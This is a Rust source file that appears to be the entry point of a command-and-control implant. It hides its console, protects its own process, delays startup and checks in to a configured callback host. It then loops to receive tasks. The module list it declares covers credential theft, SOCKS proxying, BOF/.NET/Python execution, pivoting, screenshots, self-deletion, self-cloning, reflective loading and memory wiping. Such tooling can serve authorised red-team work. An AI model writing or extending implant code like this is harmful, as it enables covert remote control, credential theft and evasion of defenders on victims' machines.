#![cfg_attr(feature = "no_console", windows_subsystem = "windows")]

mod config;
mod checkin;
mod transport;
mod s3_transport;
#[cfg(feature = "tailscale")]
mod tailscale_transport;
mod crypto;
mod tasking;
mod features {
    pub mod exit;
    pub mod pong;
    pub mod filesystem;
    pub mod upload;
    pub mod download;
    pub mod psw;
    pub mod socks;
    pub mod executeBOF;
    pub mod executeDOT;
    pub mod executePY;
    pub mod list_processes;
    pub mod pivot;
    pub mod screenshot;
    pub mod selfdelete;
    pub mod selfclone;
    pub mod loadLoader;
}
mod nt_mem;
mod selfprotect;
mod worker;
mod helpers;
mod debug_log;
mod mem_wipe;
mod reflective_loader;
mod beacon_pack;
mod loader_cache;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() >= 2 {
        match args[1].as_str() {
            "--worker-py" => {
                worker::run_py_worker();
                return;
            }
            _ => {}
        }
    }

    debug_log::install_panic_hook();
    dlog!(
        "main: start pid={} log={}",
        std::process::id(),
        debug_log::path().display()
    );
    dlog!(
        "main: host={} port={} uri={} busywork={}",
        config::callback_host,
        config::callback_port,
        config::post_uri,
        config::busywork_intensity
    );

    dlog!("main: selfprotect begin");
    selfprotect::set_process_security_descriptor();
    dlog!("main: selfprotect done");

    helpers::startup_delay();

    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        dlog!("main: tailscale init");
        loop {
            match tailscale_transport::init() {
                Ok(_) => {
                    dlog!("main: tailscale ok");
                    break;
                }
                Err(e) => {
                    dlog!("main: tailscale err: {e}");
                    helpers::idle();
                }
            }
        }
    }

    if config::use_s3 {
        dlog!("main: s3 register");
        loop {
            match s3_transport::register() {
                Ok(_) => {
                    dlog!("main: s3 ok");
                    break;
                }
                Err(e) => {
                    dlog!("main: s3 err: {e}");
                    helpers::idle();
                }
            }
        }
    }

    dlog!("main: checkin begin");
    checkin::checkin();
    dlog!("main: checkin done uuid={}", *config::UUID.read().unwrap());

    let mut round: u64 = 0;
    loop {
        round += 1;
        dlog!("main: tasking round={round} begin");
        match tasking::getTasking() {
            Ok(()) => dlog!("main: tasking round={round} ok"),
            Err(e) => dlog!("main: tasking round={round} err: {e}"),
        }
        helpers::idle();
    }
}
